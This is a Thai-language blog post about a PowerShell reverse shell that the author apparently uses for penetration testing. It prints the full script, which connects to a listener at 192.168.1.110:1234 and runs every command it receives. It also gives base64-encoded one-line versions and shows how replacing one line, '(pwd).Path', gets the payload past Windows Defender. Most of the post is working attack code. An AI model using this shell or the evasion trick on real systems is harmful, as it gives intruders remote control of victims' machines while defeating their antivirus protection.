---
title: "What The Fuck Do You Want Windows Defender?"
date: 2020-06-30T23:16:18+07:00
author: "Bongtrop"
description: "เรื่องแปลก ๆ ของนาย Windows Defender แสนวุ่นวายกับ Reverse Shell จอมซน"
---

เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ `@nikhil_mitt` โดยมีหน้าตาประมาณนี้ครับ

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.110",1234);
$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close();
```

[เต็ม ๆ อ่านที่ Link นี้นะครับ](http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html)

ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ

```
powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADAAIgAsADEAMgAzADQAKQA7ACQAYgA9ACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGQAPQAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZQA9ACQAYgAuAFIAZQBhAGQAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAJABpAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAAsADAALAAkAGUAKQA7ACQAawA9ACgAaQBlAHgAIAAkAGkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAbQA9ACQAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABvAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAG0AKQA7ACQAYgAuAFcAcgBpAHQAZQAoACQAbwAsADAALAAkAG8ALgBMAGUAbgBnAHQAaAApADsAJABiAC4ARgBsAHUAcwBoACgAKQA7AH0AOwAkAGEALgBDAGwAbwBzAGUAKAApADsA
```

แต่ผลไม่ได้เป็นดังที่หวังหลังจากผมนำไป Execute บน Windows 10 เวอร์ชันล่าสุดโดน Antivirus จับได้ซะงั้น ผมตกใจมากและคิดในใจว่า

> OMG แค่โปรแกรมเอาข้อความที่ได้รับจาก TCP มา Eval แล้วส่งกลับ มันจับได้ไงวะเนี่ย

เป็นดังภาพครับ

![Antivirus Detected](https://ggez.cc/img/wtf-do-you-want-windows-defender-1.png)

ผมเลยลองพยายามหาว่ามันจับจากอะไรพยายามลบคำสั่งต่าง ๆ ไปเรื่อย ๆ จนท้อ แต่ไม่รู้คิดไงเหมือนกัน ไปลบ `(pwd).Path` ออกจับไม่ได้เฉย Powershell Script ก็จะเป็นประมาณนี้ครับ

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.110",1234);
$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS > ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close();
```

อ่าวเห้ยคุณ Windows Defender จับแค่คำสั่งความสวยงามนี้หว่า ผมเลยลองแก้เป็นอีกคำสั่งหนึ่งที่มีความสามารถเหมือนกัน ดังนี้

`(pwd).Path` -> `(dir).DirectoryName | Select -Index 0`

ก็จะได้ Powershell Script หน้าตาประมาณนี้ครับ

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.110",1234);
$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + ((dir).DirectoryName | Select -Index 0) + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
};
$client.Close();
```

ความยาว Payload หลังจากเอาไป Minify, Encode และทำเป็น One Line ไม่ได้ยาวกว่ากันมากครับ

```
powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADAAIgAsADEAMgAzADQAKQA7ACQAYgA9ACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGQAPQAwAC4ALgAyADUANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAZQA9ACQAYgAuAFIAZQBhAGQAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQApAC0AbgBlACAAMAApAHsAJABpAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAZAAsADAALAAkAGUAKQA7ACQAawA9ACgAaQBlAHgAIAAkAGkAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAbQA9ACQAawAgACsAIAAiAFAAUwAgACIAIAArACAAKAAoAGQAaQByACkALgBEAGkAcgBlAGMAdABvAHIAeQBOAGEAbQBlACAAfAAgAFMAZQBsAGUAYwB0ACAALQBJAG4AZABlAHgAIAAwACkAIAArACAAIgA+ACAAIgA7ACQAbwA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABtACkAOwAkAGIALgBXAHIAaQB0AGUAKAAkAG8ALAAwACwAJABvAC4ATABlAG4AZwB0AGgAKQA7ACQAYgAuAEYAbAB1AHMAaAAoACkAOwB9ADsAJABhAC4AQwBsAG8AcwBlACgAKQA7AA==
```

หลังจากเอาไป Execute ก็ Happy Ending ครับ ดังรูป

![Noob Antivirus](https://ggez.cc/img/wtf-do-you-want-windows-defender-2.png)

จบเรื่องนี้ผมก็ยังไม่เข้าใจคุณ Windows Defender ว่าเขาต้องการอะไรจากน้อง Reverse Shell ของผม

1. คุณ Windows Defender จะ Detect ทำไมกับโปรแกรมรับข้อความจาก TCP มา Eval แล้วส่งกลับ
2. คุณ Windows Defender จะ Detect จาก `(pwd).Path` ไม่ได้นะครับ มันไม่ได้เป็นสาระสำคัญของ Script เลย
3. อะไรกันคับเนี่ย คุณ Windows Defender คุณคิดอะไรอยู่ ผมงงไปหมดแล้ว
